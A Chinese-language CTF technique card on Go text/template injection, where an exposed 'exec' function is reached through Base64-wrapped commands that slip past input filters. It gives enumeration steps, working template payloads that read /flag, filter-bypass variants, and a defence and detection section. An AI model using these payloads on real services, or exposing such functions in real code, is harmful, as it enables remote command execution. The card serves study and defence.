---
id: web-golang-go-template-funcmap-exec-b64decode-rce
title: Go text/template 注入 funcMap 暴露 exec：B64Decode 包裹命令绕过输入过滤执行
type: scenario
domain: web
path: web/golang
technique: go-text-template-funcmap-exec-b64decode-rce
aliases:
- Go SSTI exec 函数
- Go 模板注入命令执行
- text/template funcMap exec
- B64Decode 包裹命令绕过
- '{{exec (B64Decode "...")}}'
tags:
- golang
- go-template
- ssti
- template-injection
- rce
- command-execution
- waf-bypass
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V235
  verified_at: '2026-11-07T09:35:32+08:00'
  notes: 已对照原文与图01/02/03核对：{{.}} 回显 map[B64Decode/exec]、{{exec "ls"}} 原样返回、{{exec (B64Decode "Y2F0IC9mbGFn")}} 回显 flag 均一致；卡片对直接 exec 失败原因明确标注为未验证推测。未验证点：无应用源码，未确认直接 exec 失败的具体过滤逻辑。frontmatter 无 sources/source_url。
---

## 一句话结论

当 Go Web 应用把用户输入直接交给 `text/template` 解析，且 `FuncMap` 中注册了 `exec`、`B64Decode` 等函数时，提交 `{{.}}` 会回显可调用函数名（如 `map[B64Decode:0x... exec:0x...]`）；直接 `{{exec "ls"}}` 可能被输入过滤或解析错误挡住并原样回显，而 `{{exec (B64Decode "Y2F0IC9mbGFn")}}` 因请求中不出现命令明文，可绕过过滤执行 `cat /flag` 并回显内容。

## 原理

- **模板数据即攻击面**：Go `text/template` 会执行模板中的 `{{...}}` 表达式，并允许调用通过 `template.Funcs(FuncMap)` 注册的函数。若应用把用户提交的模板字符串直接 `Parse`/`Execute`，用户就能调用这些函数。
- **函数枚举**：模板中的 `{{.}}` 会按 Go 的默认格式化输出传入 `Execute` 的数据。原文目标返回 `map[B64Decode:0x6ee380 exec:0x6ee120]`，说明根数据是一个 map，键为 `B64Decode` 与 `exec`，值为函数（打印为地址）；据此可直接确定可调用的危险函数名。
- **为什么直接 exec 失败**：原文提交 `{{exec "ls"}}` 后结果仍是字面量 `{{exec "ls"}}`，没有命令输出；文章没有给出应用的过滤代码，推测是模板输入对命令关键字/空格/引号做了黑名单，或 exec 返回错误后应用回显了原始模板。这一点未验证，故整体置信度记 medium。
- **B64Decode 绕过的机制**：`B64Decode` 是应用注册的另一个模板函数，接收 Base64 字符串并解码为命令文本；`{{exec (B64Decode "Y2F0IC9mbGFn")}}` 在外层只出现 Base64 字面量，`cat /flag` 这类关键字在请求中不出现，因此绕过了基于明文的过滤。内层函数先求值，再把解码结果作为 `exec` 的参数交给 shell 执行。
- **为什么成立**：模板引擎本身没有沙箱，`FuncMap` 暴露了任意命令执行能力；任何“对用户模板做关键字过滤”的防护都可通过编码/拼接在运行时还原命令来绕过。

## 触发条件

- Go Web 应用存在模板注入点：用户可控字符串进入 `template.Parse` 或 `template.New(...).Parse`，随后 `Execute`/`ExecuteTemplate`。
- 模板 `FuncMap` 中注册了命令执行类函数（如包装 `os/exec` 的 `exec`）和编码类函数（如 `B64Decode`）。
- 应用没有使用受限模板/沙箱，或过滤只针对请求中的命令明文关键字。
- 应用进程有权限执行目标命令、读取目标文件。

## 利用步骤

1. 在模板输入框提交 `{{.}}`，观察回显；若返回类似 `map[B64Decode:0x... exec:0x...]`，说明模板上下文暴露了函数。
2. 直接提交 `{{exec "id"}}` 验证执行能力；若返回字面量或报错，说明存在输入过滤或解析限制。
3. 把命令 Base64 编码：`printf 'cat /flag' | base64` → `Y2F0IC9mbGFn`。
4. 提交 `{{exec (B64Decode "Y2F0IC9mbGFn")}}`；模板先在运行时解码出 `cat /flag`，再交给 `exec` 执行，响应中返回文件内容。
5. 如需其他命令，替换 Base64 内容即可；可继续用 `{{exec (B64Decode "<b64>")}}` 枚举目录、读取文件。

## PoC

```text
{{.}}
# 预期回显：map[B64Decode:0x6ee380 exec:0x6ee120]

{{exec "ls"}}
# 原文实测未执行，返回字面量 {{exec "ls"}}

{{exec (B64Decode "Y2F0IC9mbGFn")}}
# 预期回显：flag{...}
```

```python
import base64
cmd = "cat /flag"
print(base64.b64encode(cmd.encode()).decode())  # Y2F0IC9mbGFn
```

## 变体与关联

- **函数名变体**：`exec`/`cmd`/`system`/`run` 等包装 `os/exec` 的函数；`B64Decode`/`base64`/`dec` 等编码函数。先用 `{{.}}` 或错误信息枚举可调用函数。
- **编码变体**：Base64 之外，也可用十六进制、字符串拼接、`printf` 构造命令；核心是让请求中不出现被过滤的关键字。
- **引擎变体**：`html/template` 同样会执行模板表达式并调用 FuncMap，只是输出做了 HTML 转义，不影响命令执行。
- **关联**：[[web-golang-gopherblog-sqli-jwt-template-method-rce]]（Go `text/template` 调用对象方法造成命令注入）、[[web-golang-ollama-template-param-go-ssti-data-leak]]（Go 模板注入导致数据泄露）、[[web-generic-ssti-engine-identification-decision-tree-errors]]（模板引擎识别）。

## 检测与防御

- **不要执行用户模板**：用户输入只能作为模板数据（`Execute` 的 data），不能作为模板文本；确需可配置模板时使用受限的模板语言/沙箱。
- **裁剪 FuncMap**：不要向用户模板暴露 `exec`、`system`、`B64Decode` 等危险或可组合成危险链的函数；只注册纯展示、无副作用的白名单函数。
- **检测**：监控请求/日志中的 `{{`、`}}`、`{{.}}`、`B64Decode`、`exec` 等模板特征；对包含 Base64 长串且随后触发命令执行的请求告警。
- **加固**：模板执行进程降权、限制可读文件；关闭不必要的模板预览/在线编辑功能。
